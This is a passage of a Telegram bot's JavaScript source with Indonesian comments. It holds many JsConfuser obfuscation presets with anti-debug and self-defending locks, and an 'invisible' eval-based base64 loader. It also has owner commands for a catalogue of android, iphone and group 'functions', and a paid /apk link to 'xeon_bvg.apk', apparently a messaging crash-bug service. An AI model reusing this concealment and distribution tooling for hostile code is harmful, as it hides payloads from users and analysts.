    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    /*stringCompression: true, */       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    /*shuffle: true,*/
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};

const getBaileysObfuscationConfig = () => {
    const generateIdentifier = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";

        for (let i = 0; i < 6; i++) {
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }

        return `DGXeon无敌${randomPart}`;
    };

    return {
        // Target
        target: "node",

        // Output
        compact: true,
        minify: true,
        pack: false,
        sourceMap: false,

        // Identifiers
        renameVariables: false,
        renameGlobals: false,
        renameLabels: true,
        movedDeclarations: true,
        identifierGenerator: generateIdentifier,
        preserveFunctionLength: true,

        // Strings
        stringEncoding: true,
        stringConcealing: true,
        stringSplitting: 0.75,
        customStringEncodings: false,

        // Data
        calculator: true,
        duplicateLiteralsRemoval: true,
        hexadecimalNumbers: true,
        objectExtraction: false,
        globalConcealing: false,

        // Control Flow
        controlFlowFlattening: 0.35,
        opaquePredicates: 0.25,
        deadCode: 0.2,
        astScrambler: true,

        // Functions
        flatten: false,
        rgf: false,
        variableMasking: 0.3,

        // Lock
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true,
            domainLock: false,
            startDate: false,
            endDate: false,
            customLocks: false,
            countermeasures: false
        }
    };
};

// Command /siucalcrick

// Command /encgalaxy

// Konfigurasi obfuscation untuk Nebula style dengan banyak opsi aktif
const getNebulaObfuscationConfig = () => {
    const generateNebulaName = () => {
        // Identifier generator pseudo-random tanpa crypto atau timeHash
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const prefix = "NX";
        let randomPart = "";
        for (let i = 0; i < 4; i++) {
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `${prefix}${randomPart}`;
    };

    return {
        target: "node",
        compact: true,                  // Minimalkan whitespace
        renameVariables: true,          // Rename variabel
        renameGlobals: true,            // Rename global untuk keamanan
        identifierGenerator: generateNebulaName,
        /*stringCompression: true, */        // Kompresi string
        stringConcealing: false,         // Sembunyikan string
        stringEncoding: true,           // Enkripsi string
        stringSplitting: false,          // Pecah string untuk kebingungan
        controlFlowFlattening: 0.75,     // Aktif dengan intensitas sedang
        flatten: true,                  // Ratakan struktur kode
        /*shuffle: true,*/                  // Acak urutan eksekusi
        rgf: true,                      // Randomized Global Functions
        deadCode: true,                 // Tambah kode mati untuk kebingungan
        opaquePredicates: true,         // Predikat buram
        dispatcher: true,               // Acak eksekusi fungsi
        globalConcealing: true,         // Sembunyikan variabel global
        objectExtraction: true,         // Ekstrak objek untuk kebingungan
        duplicateLiteralsRemoval: true,// Pertahankan duplikat untuk kebingungan
        lock: {
            selfDefending: true,        // Lindungi dari modifikasi
            antiDebug: true,            // Cegah debugging
            integrity: true,            // Pastikan integritas
            tamperProtection: true      // Lindungi dari tampering
        }
    };
};

// Fungsi invisible encoding yang efisien dan kecil
function encodeInvisible(text) {
    try {
        // Kompresi kode dengan menghapus spasi berlebih
        const compressedText = text.replace(/\s+/g, ' ').trim();
        // Gunakan base64 untuk efisiensi
        const base64Text = Buffer.from(compressedText).toString('base64');
        // Tambahkan penanda invisible di awal
        return '\u200B' + base64Text; // Hanya penanda awal untuk invisibility minimal
    } catch (e) {
        log("Gagal encode invisible", e);
        return Buffer.from(text).toString('base64'); // Fallback ke base64
    }
}


// Konfigurasi obfuscation untuk Nova style
const getNovaObfuscationConfig = () => {
    const generateNovaName = () => {
        // Identifier generator unik dan keren
        const prefixes = ["nZ", "nova", "nx"];
        const randomPrefix = prefixes[Math.floor(Math.random() * prefixes.length)];
        const hash = crypto.createHash('sha256')
            .update(crypto.randomBytes(8))
            .digest('hex')
            .slice(0, 6); // Ambil 6 karakter pertama dari hash SHA-256
        const suffix = Math.random().toString(36).slice(2, 5); // Sufiks acak 3 karakter
        return `${randomPrefix}_${hash}_${suffix}`;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: generateNovaName, 
        /*stringCompression: true, */
        stringConcealing: true,
        stringEncoding: true,
        stringSplitting: false,
        controlFlowFlattening: 0.5, 
        flatten: true,
        /*shuffle: true,*/
        rgf: false,
        deadCode: false, 
        opaquePredicates: true,
        dispatcher: true,
        globalConcealing: true,
        objectExtraction: true,
        duplicateLiteralsRemoval: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};


// Fungsi decode invisible yang efisien
function decodeInvisible(encodedText) {
    try {
        if (!encodedText.startsWith('\u200B')) return encodedText; // Fallback jika tidak ada penanda
        const base64Text = encodedText.slice(1); // Hapus penanda invisible
        return Buffer.from(base64Text, 'base64').toString('utf-8');
    } catch (e) {
        log("Gagal decode invisible", e);
        return encodedText; // Fallback ke teks asli
    }
}

// Konfigurasi obfuscation untuk X style
const getXObfuscationConfig = () => {
    const generateXName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        return "xZ" + crypto.randomUUID().slice(0, 4); // Nama pendek dan unik
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateXName(),
        /*stringCompression: true, */
        stringConcealing: true,
        stringEncoding: true,
        stringSplitting: false,
        controlFlowFlattening: 0.5, // Stabil dan aman
        flatten: true,
        /*shuffle: true,*/
        rgf: true,
        deadCode: false, // Nonaktif untuk ukuran kecil
        opaquePredicates: true,
        dispatcher: true,
        globalConcealing: true,
        objectExtraction: true,
        duplicateLiteralsRemoval: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Max style dengan intensitas yang dapat diatur
const getMaxObfuscationConfig = (intensity) => {
    const generateMaxName = () => {
        // Nama variabel unik: prefiks "mX" + kombinasi acak
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const length = Math.floor(Math.random() * 4) + 4; // 4-7 karakter
        let name = "mX";
        for (let i = 0; i < length; i++) {
            name += chars[Math.floor(Math.random() * chars.length)];
        }
        return name;
    };

    // Skala intensitas dari 1-10 ke 0.1-1.0 untuk controlFlowFlattening
    const flatteningLevel = intensity / 10;

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateMaxName(),
        /*stringCompression: true, */ // Kompresi string
        stringConcealing: true, // Menyembunyikan string
        stringEncoding: true, // Enkripsi string
        stringSplitting: true, // Memecah string
        controlFlowFlattening: flatteningLevel, // Intensitas berdasarkan input (0.1-1.0)
        flatten: true, // Meratakan struktur kontrol
        /*shuffle: true,*/ // Mengacak urutan
        rgf: true, // Randomized Global Functions
        calculator: true, // Mengacak operasi matematika
        deadCode: true,
        opaquePredicates: true,
        dispatcher: true, // Mengacak eksekusi
        globalConcealing: true, // Menyembunyikan variabel global
        objectExtraction: true, // Mengekstrak objek untuk kebingungan
        duplicateLiteralsRemoval: false, // Menjaga redundansi
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};


// Konfigurasi obfuscation standar (diperkuat dan aman)
const getObfuscationConfig = (level = "high") => ({
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: "mangled",
    stringEncoding: true,
    stringSplitting: true,
    controlFlowFlattening: level === "high" ? 0.95 : level === "medium" ? 0.75 : 0.5,
    /*shuffle: true,*/
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
    }
});

// Konfigurasi obfuscation untuk Strong style (diperbaiki berdasarkan dokumentasi)
const getStrongObfuscationConfig = () => {
    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: "randomized", // Valid: menghasilkan nama acak
        stringEncoding: true, // Valid: mengenkripsi string
        stringSplitting: true, // Valid: memecah string
        controlFlowFlattening: 0.75, // Valid: mengacak alur kontrol
        duplicateLiteralsRemoval: true, // Valid: menghapus literal duplikat
        calculator: true, // Valid: mengacak operasi matematika
        dispatcher: true, // Valid: mengacak eksekusi dengan dispatcher
        deadCode: true, // Valid: menambahkan kode mati
        opaquePredicates: true, // Valid: menambahkan predikat buram
        lock: {
            selfDefending: true, // Valid: mencegah modifikasi
            antiDebug: true, // Valid: mencegah debugging
            integrity: true, // Valid: memastikan integritas
            tamperProtection: true // Valid: perlindungan tamper
        }
    };
};

// Konfigurasi obfuscation untuk Big style (ukuran file besar)
const getBigObfuscationConfig = () => {
    const generateBigName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const length = Math.floor(Math.random() * 5) + 5; // Nama 5-9 karakter
        let name = "";
        for (let i = 0; i < length; i++) {
            name += chars[Math.floor(Math.random() * chars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateBigName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.75, // Stabil dan kuat
        /*shuffle: true,*/
        duplicateLiteralsRemoval: true,
        deadCode: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};


// Konfigurasi obfuscation untuk Invisible style (diperbaiki)
const getInvisObfuscationConfig = () => {
    const generateInvisName = () => {
        const length = Math.floor(Math.random() * 4) + 3; // Panjang 3-6 karakter
        let name = "";
        for (let i = 0; i < length; i++) {
            name += "_"; // Menggunakan underscore untuk "invis" yang aman
        }
        // Tambahkan variasi acak agar unik
        return name + Math.random().toString(36).substring(2, 5);
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateInvisName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.95,
        /*shuffle: true,*/
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Stealth style (diperbaiki untuk stabilitas)
const getStealthObfuscationConfig = () => {
    const generateStealthName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
        const length = Math.floor(Math.random() * 3) + 1; // Nama pendek 1-3 karakter
        let name = "";
        for (let i = 0; i < length; i++) {
            name += chars[Math.floor(Math.random() * chars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateStealthName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.75, // Dikurangi untuk stabilitas
        /*shuffle: true,*/
        duplicateLiteralsRemoval: true,
        deadCode: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Custom style (dengan nama kustom)
const getCustomObfuscationConfig = (customName) => {
    const generateCustomName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        const randomSuffixLength = Math.floor(Math.random() * 3) + 2; // Sufiks acak 2-4 karakter
        let suffix = "";
        for (let i = 0; i < randomSuffixLength; i++) {
            suffix += chars[Math.floor(Math.random() * chars.length)];
        }
        // Gunakan nama kustom sebagai prefiks, tambahkan sufiks acak
        return `${customName}_${suffix}`;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateCustomName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.75, // Stabil dan kuat
        /*shuffle: true,*/
        duplicateLiteralsRemoval: true,
        deadCode: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Mandarin style (diperkuat dan aman)
const getMandarinObfuscationConfig = () => {
    const mandarinChars = [
        "龙", "虎", "风", "云", "山", "河", "天", "地", "雷", "电",
        "火", "水", "木", "金", "土", "星", "月", "日", "光", "影",
        "峰", "泉", "林", "海", "雪", "霜", "雾", "冰", "焰", "石"
    ];

    const generateMandarinName = () => {
        const length = Math.floor(Math.random() * 4) + 3;
        let name = "";
        for (let i = 0; i < length; i++) {
            name += mandarinChars[Math.floor(Math.random() * mandarinChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateMandarinName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.95,
        /*shuffle: true,*/
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Arab style (diperkuat dan aman)
const getArabObfuscationConfig = () => {
    const arabicChars = [
        "أ", "ب", "ت", "ث", "ج", "ح", "خ", "د", "ذ", "ر",
        "ز", "س", "ش", "ص", "ض", "ط", "ظ", "ع", "غ", "ف",
        "ق", "ك", "ل", "م", "ن", "ه", "و", "ي"
    ];

    const generateArabicName = () => {
        const length = Math.floor(Math.random() * 4) + 3;
        let name = "";
        for (let i = 0; i < length; i++) {
            name += arabicChars[Math.floor(Math.random() * arabicChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateArabicName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.95,
        /*shuffle: true,*/
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

const getJapanxArabObfuscationConfig = () => {
    const japaneseXArabChars = [
        "あ", "い", "う", "え", "お", "か", "き", "く", "け", "こ",
        "さ", "し", "す", "せ", "そ", "た", "ち", "つ", "て", "と",
        "な", "に", "ぬ", "ね", "の", "は", "ひ", "ふ", "へ", "ほ",
        "ま", "み", "む", "め", "も", "や", "ゆ", "よ","أ", "ب", "ت", "ث", "ج", "ح", "خ", "د", "ذ", "ر",
        "ز", "س", "ش", "ص", "ض", "ط", "ظ", "ع", "غ", "ف",
        "ق", "ك", "ل", "م", "ن", "ه", "و", "ي","ら", "り", "る", "れ", "ろ", "わ", "を", "ん" 
    ];

    const generateJapaneseXArabName = () => {
        const length = Math.floor(Math.random() * 4) + 3; // Panjang 3-6 karakter
        let name = "";
        for (let i = 0; i < length; i++) {
            name += japaneseXArabChars[Math.floor(Math.random() * japaneseXArabChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateJapaneseXArabName(),
        /*stringCompression: true, */ // Kompresi string
        stringConcealing: true, // Menyembunyikan string
        stringEncoding: true, // Enkripsi string
        stringSplitting: true, // Memecah string        
        controlFlowFlattening: 0.95, // Sedikit lebih rendah untuk variasi
        flatten: true,              // Metode baru: mengganti struktur kontrol
        /*shuffle: true,*/
        rgf: false,
        dispatcher: true,
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};
const getUltraObfuscationConfig = () => {
    const generateUltraName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyz";
        const numbers = "0123456789";
        const randomNum = numbers[Math.floor(Math.random() * numbers.length)];
        const randomChar = chars[Math.floor(Math.random() * chars.length)];
        return `z${randomNum}${randomChar}${Math.random().toString(36).substring(2, 6)}`;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateUltraName(),
        /*stringCompression: true, */ // Kompresi string untuk keamanan tinggi
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.9,
        flatten: true,
        /*shuffle: true,*/
        rgf: true, // Randomized Global Functions
        deadCode: true,
        opaquePredicates: true,
        dispatcher: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk Japan style (diperkuat dan aman)
const getJapanObfuscationConfig = () => {
    const japaneseChars = [
        "あ", "い", "う", "え", "お", "か", "き", "く", "け", "こ",
        "さ", "し", "す", "せ", "そ", "た", "ち", "つ", "て", "と",
        "な", "に", "ぬ", "ね", "の", "は", "ひ", "ふ", "へ", "ほ",
        "ま", "み", "む", "め", "も", "や", "ゆ", "よ",
        "ら", "り", "る", "れ", "ろ", "わ", "を", "ん"
    ];

    const generateJapaneseName = () => {
        const length = Math.floor(Math.random() * 4) + 3; // Panjang 3-6 karakter
        let name = "";
        for (let i = 0; i < length; i++) {
            name += japaneseChars[Math.floor(Math.random() * japaneseChars.length)];
        }
        return name;
    };

    return {
        target: "node",
        compact: true,
        renameVariables: true,
        renameGlobals: true,
        identifierGenerator: () => generateJapaneseName(),
        stringEncoding: true,
        stringSplitting: true,
        controlFlowFlattening: 0.9, // Sedikit lebih rendah untuk variasi
        flatten: true,              // Metode baru: mengganti struktur kontrol
        /*shuffle: true,*/
        duplicateLiteralsRemoval: true,
        deadCode: true,
        calculator: true,
        opaquePredicates: true,
        lock: {
            selfDefending: true,
            antiDebug: true,
            integrity: true,
            tamperProtection: true
        }
    };
};

// Konfigurasi obfuscation untuk /nou (diperkuat dan aman)
const getNewObfuscationConfig = () => ({
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: "mangled",
    stringEncoding: true,
    stringSplitting: true,
    controlFlowFlattening: 0.95,
    /*shuffle: true,*/
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
    }
});

const handleObfusCommand = async (msg, configGetter, styleName, options = {}) => {
    const chatId = msg.chat.id;
    const senderId = msg.from.id;

    if (!CONFIG.owner.includes(senderId)) {
        return bot.sendMessage(chatId, "❌ Obfuscation commands are owner-only.");
    }

    if (!msg.reply_to_message || !msg.reply_to_message.document) {
        return bot.sendMessage(chatId, "❌ Reply to a .js file!");
    }

    const file = msg.reply_to_message.document;
    if (!file.file_name.endsWith('.js')) {
        return bot.sendMessage(chatId, "❌ Only .js files supported!");
    }

    const progressMsg = await bot.sendMessage(chatId, "```css\n🔒 Starting... (0%)\n▱▱▱▱▱▱▱▱▱▱\n```", { parse_mode: 'Markdown' });

    const updateProgress = async (percent, status) => {
        const bar = createProgressBar(percent);
        await bot.editMessageText(`\`\`\`css\n🔒 ${styleName}\n${percent === 100 ? "✅ Done" : "⚙️ " + status} (${percent}%)\n${bar}\n\`\`\``, {
            chat_id: chatId,
            message_id: progressMsg.message_id,
            parse_mode: 'Markdown'
        });
    };

    try {
        await updateProgress(10, "Downloading");
        const fileInfo = await bot.getFile(file.file_id);
        const fileLink = `https://api.telegram.org/file/bot${CONFIG.botToken}/${fileInfo.file_path}`;
        const response = await fetch(fileLink);
        let content = await response.text();

        await updateProgress(30, "Validating");
        new Function(content); // Basic syntax check

        await updateProgress(50, "Obfuscating");

        let finalCode;

        // Special obfuscators (no JsConfuser)
        if (options.special === 'quantum') {
            finalCode = await obfuscateQuantum(content);
        } else if (options.special === 'timelocked') {
            finalCode = await obfuscateTimeLocked(content, options.days);
        } else {
            // Standard JsConfuser path
            let conf;
            if (typeof configGetter === 'function') {
                conf = configGetter(options.param);
            } else {
                conf = configGetter; // Direct config object
            }

            if (!conf || typeof conf !== 'object') {
                throw new Error("Invalid or missing obfuscation configuration");
            }

            const result = await JsConfuser.obfuscate(content, conf);
            finalCode = result.code || result;
        }

        // Post-processing layers
        if (options.invisible) {
            const encoded = encodeInvisible(finalCode);
            finalCode = `(function(){function d(t){if(!t.startsWith('\\u200B'))return t;try{return Buffer.from(t.slice(1),'base64').toString('utf-8');}catch(e){return t;}}try{eval(d("${encoded}"));}catch(e){}})();`;
        }

        if (options.bigSize) {
            const currentBytes = Buffer.byteLength(finalCode, 'utf8');
            const targetBytes = options.bigSize * 1024 * 1024;
            if (currentBytes < targetBytes) {
                const paddingSize = targetBytes - currentBytes;
                const padding = crypto.randomBytes(paddingSize).toString('base64');
                finalCode += `\n/* Padding ${paddingSize} bytes */\n// ${padding}`;
            }
        }

        const header = `/*\nCant steal my code??Hahaha\nBuy Full Source Code From me\nTelegram: @dgxeon13\n*/\n\n`;
        finalCode = header + finalCode;

        const tempPath = path.join(__dirname, `temp-obfus-${Date.now()}-${file.file_name}`);
        await fse.writeFile(tempPath, finalCode);
        await updateProgress(90, "Sending");

        await bot.sendDocument(chatId, tempPath, {
            caption: `✅ ${styleName} obfuscation complete!`,
            filename: `obfuscated-${styleName.toLowerCase().replace(/\s+/g, '-')}-${file.file_name}`
        });

        await updateProgress(100, "Done");
        await fse.remove(tempPath);
    } catch (err) {
        console.error("Obfus error:", err);
        bot.sendMessage(chatId, `❌ Error: ${err.message || "Unknown error during obfuscation"}`);
        try {
            await updateProgress(100, "Failed");
        } catch {}
    }
};

function registerCommandHandlers(botInstance, isRootBot = false) {

// ====================== REAL APP PANEL COMMANDS ======================
botInstance.onText(/^\/resetuser$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;
  if (!CONFIG.owner.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only Owner can use this command.');
  }

  try {
    await userBot.sendMessage(chatId, '⏳ Deleting all users from panel...');

    const users = await appRequest('users.list', {});
    if (!users.length) {
      appCreators = {};
      saveJson('./database/app_creators.json', appCreators);
      return userBot.sendMessage(chatId, '✅ No users found. Local mapping cleared.');
    }

    let ok = 0;
    let fail = 0;

    for (const u of users) {
      try {
        await appRequest('user.delete', { id: u.id });
        ok++;
      } catch (e) {
        fail++;
      }
    }

    // Clear local creator mapping
    appCreators = {};
    saveJson('./database/app_creators.json', appCreators);

    await userBot.sendMessage(chatId,
`✅ <b>Reset complete</b>

Deleted from panel: <b>${ok}</b>
Failed: <b>${fail}</b>
Local mapping: cleared`, { parse_mode: 'HTML' });

  } catch (err) {
    await userBot.sendMessage(chatId, `❌ Error: ${err.message}`);
  }
});

botInstance.onText(/\/apk/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;

  const membership = await checkMembership(chatId, senderId, isRootBot);
  if (!membership.isMember) return;

  // VIP Check
  if (!(await hasVipAccess(senderId, userBot))) {
    return userBot.sendMessage(chatId, `🚫 You are not authorized to use this command.

📩 Please contact the developer to buy: ${CONFIG.usertele}

💰 Price/Harga:
✅ Access permanent: 30$
✅ Resell permanent: 50$
✅ Script/source code: 120$
✅ Make your own bvg bot with your name/customised bvg bot: 120$

Prices are negotiable or can be discounted!!`);
  }

  try {
    await userBot.sendMessage(
      chatId,
      `☣︎ <a href="https://drive.google.com/file/d/1tNdfZNpaBeR86e5SuY12sCw-sUpCsy_U/view?usp=drivesdk">xeon_bvg.apk</a>`,
      {
        parse_mode: 'HTML',
        disable_web_page_preview: true
      }
    );

    console.log(`apk link sent to user ${senderId}`);

  } catch (error) {
    console.error('Error sending apk link:', error);

    await userBot.sendMessage(
      chatId,
      `❌ Failed to send apk link: ${error.message}`
    );
  }
});

// /function <code>  — inspect one function
botInstance.onText(/^\/function\s+([a-z0-9_-]{2,80})$/, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;
  if (!CONFIG.owner.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only Owner can use this command.');
  }

  const code = match[1].toLowerCase();
  const body = getFunctionCode(code);

  if (body === null) {
    return userBot.sendMessage(chatId, '❌ not_found');
  }

  await userBot.sendMessage(chatId,
`code: <code>${code}</code>
label: ${getCatalogLabel(code)}
kind: ${getCatalogKind(code)}
size: ${body.length}`, { parse_mode: 'HTML' });
});

// /btnlist or /functions (improved)
botInstance.onText(/^\/(btnlist|functions)$/, async (msg) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;
  if (!CONFIG.owner.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only Owner can use this command.');
  }

  const items = getFullCatalog();
  const byKind = { android: [], iphone: [], group: [] };

  for (const it of items) {
    if (byKind[it.kind]) byKind[it.kind].push(it);
    else byKind.android.push(it);
  }

  let text = `<b>📋 Functions / Buttons</b>\n\n`;

  for (const [kind, list] of Object.entries(byKind)) {
    if (!list.length) continue;
    text += `<b>${kind.toUpperCase()}</b> (${list.length}/${APP_MAX_PER_KIND})\n`;
    for (const it of list) {
      const hasFile = getFunctionCode(it.code) !== null;
      text += `  <code>${it.code}</code> → ${it.label} ${hasFile ? '✅' : '⚠️ no file'}\n`;
    }
    text += '\n';
  }

  if (text.length > 3900) text = text.slice(0, 3900) + '\n...';
  await userBot.sendMessage(chatId, text || 'No functions found.', { parse_mode: 'HTML' });
});

// /btnadd
botInstance.onText(/^\/btnadd\s+([a-z0-9_-]{2,80})\s+(android|iphone|group)\s+(.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;
  if (!CONFIG.owner.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only Owner can use this command.');
  }

  const code = match[1].toLowerCase();
  const kind = match[2].toLowerCase();
  const label = match[3].trim().slice(0, 80);

  if (!label) return userBot.sendMessage(chatId, '❌ Label required.');

  const cat = loadCatalog();
  if (cat[code]) return userBot.sendMessage(chatId, '❌ Code already exists.');
  if (countCatalogKind(kind) >= APP_MAX_PER_KIND) {
    return userBot.sendMessage(chatId, `❌ Max ${APP_MAX_PER_KIND} buttons for ${kind}.`);
  }

  cat[code] = { label, kind };
  saveCatalog(cat);
  syncCatalogToPanel();

  const hasFile = getFunctionCode(code) !== null;
  await userBot.sendMessage(chatId,
`✅ Button added

code: <code>${code}</code>
kind: ${kind}
label: ${label}
${hasFile ? 'file: ✅ present' : 'file: ⚠️ put <code>' + code + '.txt</code> in functions/'}`,
  { parse_mode: 'HTML' });
});

// /btnedit
botInstance.onText(/^\/btnedit\s+([a-z0-9_-]{2,80})\s+(.+)$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;
  if (!CONFIG.owner.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only Owner can use this command.');
  }

  const code = match[1].toLowerCase();
  const label = match[2].trim().slice(0, 80);
  const cat = loadCatalog();

  if (!cat[code]) return userBot.sendMessage(chatId, '❌ Code not found in catalog.');

  cat[code].label = label;
  saveCatalog(cat);
  syncCatalogToPanel();

  await userBot.sendMessage(chatId, `✅ Label updated\n<code>${code}</code> → ${label}`, { parse_mode: 'HTML' });
});

// /btnrename
botInstance.onText(/^\/btnrename\s+([a-z0-9_-]{2,80})\s+([a-z0-9_-]{2,80})$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;
  if (!CONFIG.owner.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only Owner can use this command.');
  }

  const oldCode = match[1].toLowerCase();
  const newCode = match[2].toLowerCase();
  const cat = loadCatalog();

  if (!cat[oldCode]) return userBot.sendMessage(chatId, '❌ Old code not found.');
  if (cat[newCode]) return userBot.sendMessage(chatId, '❌ New code already exists.');

  cat[newCode] = cat[oldCode];
  delete cat[oldCode];
  saveCatalog(cat);

  // Rename the actual .txt file if it exists
  const oldPath = path.join(APP_FUNCTIONS_DIR, oldCode + '.txt');
  const newPath = path.join(APP_FUNCTIONS_DIR, newCode + '.txt');
  if (fs.existsSync(oldPath) && !fs.existsSync(newPath)) {
    fs.renameSync(oldPath, newPath);
  }

  syncCatalogToPanel();
  await userBot.sendMessage(chatId, `✅ Code renamed\n<code>${oldCode}</code> → <code>${newCode}</code>`, { parse_mode: 'HTML' });
});

// /btnremove
botInstance.onText(/^\/btnremove\s+([a-z0-9_-]{2,80})$/i, async (msg, match) => {
  const chatId = msg.chat.id;
  const senderId = msg.from.id;
  const userBot = getUserBot(botInstance);

  if (msg.chat.type !== 'private') return;
  if (!CONFIG.owner.includes(senderId)) {
    return userBot.sendMessage(chatId, '❌ Only Owner can use this command.');
  }

  const code = match[1].toLowerCase();
  const cat = loadCatalog();

  if (!cat[code]) return userBot.sendMessage(chatId, '❌ Code not found in catalog.');

  delete cat[code];
  saveCatalog(cat);
  syncCatalogToPanel();

  await userBot.sendMessage(chatId,
`✅ Button <code>${code}</code> removed from catalog.
(Function file was not deleted — remove it manually if needed)`,
  { parse_mode: 'HTML' });
});

